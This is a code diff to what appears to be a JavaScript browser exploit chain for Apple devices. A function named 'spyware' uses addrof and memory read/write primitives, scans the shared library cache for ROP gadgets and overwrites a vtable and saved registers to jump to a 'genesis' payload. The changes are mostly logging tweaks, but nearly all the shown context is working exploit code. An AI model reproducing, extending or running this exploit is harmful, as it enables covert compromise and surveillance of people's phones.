@@ -95,11 +95,11 @@ function _u32(i)
 
 function _read(i, l)
 {
-    if(i instanceof Int64) i = i.lo();
-    if(l instanceof Int64) l = l.lo();
-    if(i + l > this.length)
+    if (i instanceof Int64) i = i.lo();
+    if (l instanceof Int64) l = l.lo();
+    if (i + l > this.length)
     {
-        fail("OOB read: " + i + "-" + (i + l));
+        fail(`OOB read: ${i} -> ${i + l}, size: ${l}`);
     }
     return this.slice(i, i + l);
 }
@@ -117,6 +117,8 @@ function _writeInt64(i, val)
 
 function spyware(stage1, memory, binary)
 {
+    print(`binary length: ${hexit(binary.length)}`)
+
     //alert('spyware')
     var wrapper = document.createElement("div")
     var wrapper_addr = stage1.addrof(wrapper)
@@ -256,7 +258,7 @@ function spyware(stage1, memory, binary)
             "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
         ];
     }
-    alert('lookin through cache');
+    print('lookin through cache');
 
     var syms = {};
     var gadgets = {};
@@ -296,7 +298,7 @@ function spyware(stage1, memory, binary)
 
                             // Copy the entire __text region into a Uint32Array for faster processing.
                             // Previously you could map a Uint32Array over the data, but on i7+ devices 
-                            // this caused access violations (possibly due to SMAP -- please confirm).
+                            // this caused access violations.
                             // Instead we read the entire region and copy it into a Uint32Array. The
                             // memory.read primitive has a weird limitation where it's only able to read
                             // up to 4096 bytes. to get around this we'll read multiple times and combine
@@ -385,7 +387,7 @@ function spyware(stage1, memory, binary)
         }
     }
 
-    alert('all gadgets found')
+    print('all gadgets found')
     var longjmp             = syms["__longjmp"];
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
@@ -500,7 +502,7 @@ function spyware(stage1, memory, binary)
         fail("genesis");
     }
     var jmpAddr = Add(psyms["genesis"], shslide);
-    print(`finna jmp ${hexit(jmpAddr)}`)
+    print(`finna jmp ${jmpAddr}`)
 
     memory.writeInt64(Add(vtab, 0x18), longjmp);
     memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)
